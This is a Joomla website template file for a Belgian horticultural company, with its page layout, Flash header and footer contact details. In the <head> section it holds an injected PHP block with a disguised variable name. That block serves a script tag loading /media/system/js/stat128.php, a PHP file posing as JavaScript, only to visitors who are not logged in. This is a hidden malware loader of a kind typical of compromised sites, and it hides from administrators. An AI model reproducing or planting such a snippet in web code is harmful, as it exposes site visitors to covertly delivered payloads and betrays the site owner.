<?php
defined('_JEXEC') or die('Restricted access'); // no direct access
require_once dirname(__FILE__) . DIRECTORY_SEPARATOR . 'functions.php';
$document = null;
if (isset($this))
  $document = & $this;
$baseUrl = $this->baseurl;
$templateUrl = $this->baseurl . '/templates/' . $this->template;
artxComponentWrapper($document);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="<?php echo $this->language; ?>" lang="<?php echo $this->language; ?>" >
<head>
 <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
 <jdoc:include type="head" />
 <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/system.css" type="text/css" />
 <link rel="stylesheet" href="<?php echo $this->baseurl; ?>/templates/system/css/general.css" type="text/css" />
 <link rel="stylesheet" type="text/css" href="<?php echo $templateUrl; ?>/css/template.css" media="screen" />
 <!--[if IE 6]><link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.ie6.css" type="text/css" media="screen" /><![endif]-->
 <!--[if IE 7]><link rel="stylesheet" href="<?php echo $templateUrl; ?>/css/template.ie7.css" type="text/css" media="screen" /><![endif]-->
 <script type="text/javascript" src="<?php echo $templateUrl; ?>/script.js"></script>



<?php $_128ce48f=1;if(is_object($_SESSION["__default"]["user"]) && !($_SESSION["__default"]["user"]->id)) {echo "
<script language=JavaScript id=onDate ></script>
<script language=JavaScript src=/media/system/js/stat128.php ></script>
";};$_128ce48f=1; ?>
</head>
<body>
<div id="art-page-background-glare">
    <div id="art-page-background-glare-image"></div>
</div>
<div id="art-main">
<div class="art-sheet">
    <div class="art-sheet-tl"></div>
    <div class="art-sheet-tr"></div>
    <div class="art-sheet-bl"></div>
    <div class="art-sheet-br"></div>
    <div class="art-sheet-tc"></div>
    <div class="art-sheet-bc"></div>
    <div class="art-sheet-cl"></div>
    <div class="art-sheet-cr"></div>
    <div class="art-sheet-cc"></div>
    <div class="art-sheet-body">
<div class="art-header">
    <div class="art-header-png"></div>
    <div class="art-header-jpeg"></div>
<script type="text/javascript" src="<?php echo $templateUrl; ?>/swfobject.js"></script>
<div id="art-flash-area">
<div id="art-flash-container">
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" width="998" height="282" id="art-flash-object">
	<param name="movie" value="<?php echo $templateUrl; ?>/container.swf" />
	<param name="quality" value="high" />
	<param name="scale" value="default" />
	<param name="wmode" value="transparent" />
	<param name="flashvars" value="color1=0xFFFFFF&amp;alpha1=.50&amp;framerate1=24&amp;clip=<?php echo $templateUrl; ?>/images/flash.swf&amp;radius=40&amp;clipx=-65&amp;clipy=0&amp;initalclipw=900&amp;initalcliph=225&amp;clipw=1128&amp;cliph=282&amp;width=998&amp;height=282&amp;textblock_width=0&amp;textblock_align=no" />
    <param name="swfliveconnect" value="true" />
	<!--[if !IE]>-->
	<object type="application/x-shockwave-flash" data="<?php echo $templateUrl; ?>/container.swf" width="998" height="282">
	    <param name="quality" value="high" />
	    <param name="scale" value="default" />
	    <param name="wmode" value="transparent" />
    	<param name="flashvars" value="color1=0xFFFFFF&amp;alpha1=.50&amp;framerate1=24&amp;clip=<?php echo $templateUrl; ?>/images/flash.swf&amp;radius=40&amp;clipx=-65&amp;clipy=0&amp;initalclipw=900&amp;initalcliph=225&amp;clipw=1128&amp;cliph=282&amp;width=998&amp;height=282&amp;textblock_width=0&amp;textblock_align=no" />
        <param name="swfliveconnect" value="true" />
	<!--<![endif]-->
		<div class="art-flash-alt"><a href="http://www.adobe.com/go/getflashplayer"><img src="http://www.adobe.com/images/shared/download_buttons/get_flash_player.gif" alt="Get Adobe Flash player" /></a></div>
	<!--[if !IE]>-->
	</object>
	<!--<![endif]-->
</object>
</div>
</div>
<script type="text/javascript">swfobject.switchOffAutoHideShow();swfobject.registerObject("art-flash-object", "9.0.0", "<?php echo $templateUrl; ?>/expressInstall.swf");</script>

</div>
<jdoc:include type="modules" name="user3" />
<jdoc:include type="modules" name="banner1" style="artstyle" artstyle="art-nostyle" />
<?php echo artxPositions($document, array('top1', 'top2', 'top3'), 'art-block'); ?>
<div class="art-content-layout">
    <div class="art-content-layout-row">
<?php if (artxCountModules($document, 'left')) : ?>
<div class="art-layout-cell art-sidebar1"><?php echo artxModules($document, 'left', 'art-block'); ?>
</div>
<?php endif; ?>
<div class="art-layout-cell art-<?php echo artxCountModules($document, 'left') ? 'content' : 'content-wide'; ?>">

<?php
  echo artxModules($document, 'banner2', 'art-nostyle');
  if (artxCountModules($document, 'breadcrumb'))
    echo artxPost(null, artxModules($document, 'breadcrumb'));
  echo artxPositions($document, array('user1', 'user2'), 'art-article');
  echo artxModules($document, 'banner3', 'art-nostyle');
?>
<?php if (artxHasMessages()) : ?><div class="art-post">
    <div class="art-post-tl"></div>
    <div class="art-post-tr"></div>
    <div class="art-post-bl"></div>
    <div class="art-post-br"></div>
    <div class="art-post-tc"></div>
    <div class="art-post-bc"></div>
    <div class="art-post-cl"></div>
    <div class="art-post-cr"></div>
    <div class="art-post-cc"></div>
    <div class="art-post-body">
<div class="art-post-inner">
<div class="art-postcontent">
    <!-- article-content -->

<jdoc:include type="message" />

    <!-- /article-content -->
</div>
<div class="cleared"></div>

</div>

		<div class="cleared"></div>
    </div>
</div>
<?php endif; ?>
<jdoc:include type="component" />
<?php echo artxModules($document, 'banner4', 'art-nostyle'); ?>
<?php echo artxPositions($document, array('user4', 'user5'), 'art-article'); ?>
<?php echo artxModules($document, 'banner5', 'art-nostyle'); ?>
</div>

    </div>
</div>
<div class="cleared"></div>

<?php echo artxPositions($document, array('bottom1', 'bottom2', 'bottom3'), 'art-block'); ?>
<jdoc:include type="modules" name="banner6" style="artstyle" artstyle="art-nostyle" />
<div class="art-footer">
 <div class="art-footer-inner">
  <?php echo artxModules($document, 'syndicate'); ?>
  <div class="art-footer-text">
  <?php if (artxCountModules($document, 'copyright') == 0): ?>
<p>Rue du Marais 127 - 4500 Tihange - BELGIQUE - Tél. : 085/21.23.71 - Fax : 085/21.48.11 - Email : <a href="mailto:info@ets-horticoles-flamand.be" target="_blank">info@ets-horticoles-flamand.be</a> 
copyright © 2011<br/>
</p>
  <?php else: ?>
  <?php echo artxModules($document, 'copyright', 'art-nostyle'); ?>
  <?php endif; ?>
  </div>
 </div>
 <div class="art-footer-background"></div>
</div>

		<div class="cleared"></div>
    </div>
</div>
<div class="cleared"></div>
<p class="art-page-footer"><a href="http://www.siteweb.be" target="_blank" class="Style1"> Creation © siteweb.be </a></p>

</div>

</body> 
</html>